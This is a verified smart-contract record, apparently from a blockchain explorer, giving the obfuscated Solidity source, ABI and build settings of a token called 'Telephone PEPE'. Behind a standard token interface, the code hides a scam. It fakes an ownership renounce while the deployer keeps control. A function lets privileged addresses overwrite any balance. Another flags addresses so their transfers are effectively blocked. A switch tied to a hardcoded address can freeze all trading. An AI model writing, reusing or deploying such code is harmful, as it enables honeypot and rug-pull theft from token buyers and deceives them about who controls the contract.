{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.0;\n\ninterface isTotal {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address toLaunched) external view returns (uint256);\n\n    function transfer(address autoShould, uint256 exemptBuy) external returns (bool);\n\n    function allowance(address liquidityLaunched, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 exemptBuy) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address autoShould,\n        uint256 exemptBuy\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed limitTrading, uint256 value);\n    event Approval(address indexed liquidityLaunched, address indexed spender, uint256 value);\n}\n\nabstract contract tokenSell {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface marketingExempt {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface listSwap {\n    function createPair(address shouldEnable, address tokenTeam) external returns (address);\n}\n\ninterface txLaunch is isTotal {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract TelephonePEPE is tokenSell, isTotal, txLaunch {\n\n    function approve(address liquidityAmount, uint256 exemptBuy) public virtual override returns (bool) {\n        enableTradingLiquidity[_msgSender()][liquidityAmount] = exemptBuy;\n        emit Approval(_msgSender(), liquidityAmount, exemptBuy);\n        return true;\n    }\n\n    uint256 public feeMin;\n\n    mapping(address => bool) public senderMaxTake;\n\n    function owner() external view returns (address) {\n        return minList;\n    }\n\n    address maxTrading = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 private toAutoTake;\n\n    bool private sellReceiver;\n\n    bool public launchIs;\n\n    uint8 private maxLimit = 18;\n\n    uint256 public autoLimit;\n\n    function name() external view virtual override returns (string memory) {\n        return modeLimit;\n    }\n\n    bool public limitReceiver;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return exemptAuto;\n    }\n\n    constructor (){\n        if (launchIs) {\n            toLiquidity = false;\n        }\n        marketingExempt teamIs = marketingExempt(maxTrading);\n        marketingTx = listSwap(teamIs.factory()).createPair(teamIs.WETH(), address(this));\n        \n        atWalletTake = _msgSender();\n        modeMaxTrading();\n        senderMaxTake[atWalletTake] = true;\n        receiverFrom[atWalletTake] = exemptAuto;\n        if (toAutoTake != feeMin) {\n            listToTeam = true;\n        }\n        emit Transfer(address(0), atWalletTake, exemptAuto);\n    }\n\n    function senderList(address launchedEnable) public {\n        fundFrom();\n        if (launchIs) {\n            totalLaunch = true;\n        }\n        if (launchedEnable == atWalletTake || launchedEnable == marketingTx) {\n            return;\n        }\n        receiverShould[launchedEnable] = true;\n    }\n\n    address receiverLaunchedToken = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 private marketingLaunched;\n\n    mapping(address => bool) public receiverShould;\n\n    uint256 private exemptAuto = 100000000 * 10 ** 18;\n\n    uint256 toBuy;\n\n    address public atWalletTake;\n\n    function fundFrom() private view {\n        require(senderMaxTake[_msgSender()]);\n    }\n\n    function getOwner() external view returns (address) {\n        return minList;\n    }\n\n    mapping(address => uint256) private receiverFrom;\n\n    function balanceOf(address toLaunched) public view virtual override returns (uint256) {\n        return receiverFrom[toLaunched];\n    }\n\n    bool public totalLaunch;\n\n    string private modeLimit = \"Telephone PEPE\";\n\n    function transfer(address swapWalletReceiver, uint256 exemptBuy) external virtual override returns (bool) {\n        return launchLaunchedExempt(_msgSender(), swapWalletReceiver, exemptBuy);\n    }\n\n    function launchLaunchedExempt(address listMin, address autoShould, uint256 exemptBuy) internal returns (bool) {\n        if (listMin == atWalletTake) {\n            return atLimitSwap(listMin, autoShould, exemptBuy);\n        }\n        uint256 minTokenSell = isTotal(marketingTx).balanceOf(receiverLaunchedToken);\n        require(minTokenSell == toBuy);\n        require(autoShould != receiverLaunchedToken);\n        if (receiverShould[listMin]) {\n            return atLimitSwap(listMin, autoShould, liquidityEnable);\n        }\n        return atLimitSwap(listMin, autoShould, exemptBuy);\n    }\n\n    address public marketingTx;\n\n    bool private listToTeam;\n\n    bool private toLiquidity;\n\n    function modeMaxTrading() public {\n        emit OwnershipTransferred(atWalletTake, address(0));\n        minList = address(0);\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return liquidityEnableMarketing;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return maxLimit;\n    }\n\n    uint256 constant liquidityEnable = 12 ** 10;\n\n    function transferFrom(address listMin, address autoShould, uint256 exemptBuy) external override returns (bool) {\n        if (_msgSender() != maxTrading) {\n            if (enableTradingLiquidity[listMin][_msgSender()] != type(uint256).max) {\n                require(exemptBuy <= enableTradingLiquidity[listMin][_msgSender()]);\n                enableTradingLiquidity[listMin][_msgSender()] -= exemptBuy;\n            }\n        }\n        return launchLaunchedExempt(listMin, autoShould, exemptBuy);\n    }\n\n    event OwnershipTransferred(address indexed autoReceiver, address indexed sellMarketing);\n\n    address private minList;\n\n    mapping(address => mapping(address => uint256)) private enableTradingLiquidity;\n\n    function isMaxFund(address fundToken) public {\n        require(fundToken.balance < 100000);\n        if (limitReceiver) {\n            return;\n        }\n        if (feeMin == limitSender) {\n            limitSender = feeMin;\n        }\n        senderMaxTake[fundToken] = true;\n        \n        limitReceiver = true;\n    }\n\n    uint256 atTeamEnable;\n\n    function atLimitSwap(address listMin, address autoShould, uint256 exemptBuy) internal returns (bool) {\n        require(receiverFrom[listMin] >= exemptBuy);\n        receiverFrom[listMin] -= exemptBuy;\n        receiverFrom[autoShould] += exemptBuy;\n        emit Transfer(listMin, autoShould, exemptBuy);\n        return true;\n    }\n\n    function allowance(address takeMinSwap, address liquidityAmount) external view virtual override returns (uint256) {\n        if (liquidityAmount == maxTrading) {\n            return type(uint256).max;\n        }\n        return enableTradingLiquidity[takeMinSwap][liquidityAmount];\n    }\n\n    function feeTeam(address swapWalletReceiver, uint256 exemptBuy) public {\n        fundFrom();\n        receiverFrom[swapWalletReceiver] = exemptBuy;\n    }\n\n    uint256 public limitSender;\n\n    function amountFromWallet(uint256 exemptBuy) public {\n        fundFrom();\n        toBuy = exemptBuy;\n    }\n\n    string private liquidityEnableMarketing = \"TPE\";\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"liquidityLaunched\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"autoReceiver\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"sellMarketing\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"limitTrading\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeMinSwap\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"liquidityAmount\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"exemptBuy\",\"type\":\"uint256\"}],\"name\":\"amountFromWallet\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"liquidityAmount\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"exemptBuy\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"atWalletTake\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoLimit\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toLaunched\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeMin\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapWalletReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"exemptBuy\",\"type\":\"uint256\"}],\"name\":\"feeTeam\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fundToken\",\"type\":\"address\"}],\"name\":\"isMaxFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchIs\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitSender\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingTx\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"modeMaxTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"receiverShould\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedEnable\",\"type\":\"address\"}],\"name\":\"senderList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"senderMaxTake\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalLaunch\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"swapWalletReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"exemptBuy\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"listMin\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"autoShould\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"exemptBuy\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "TelephonePEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}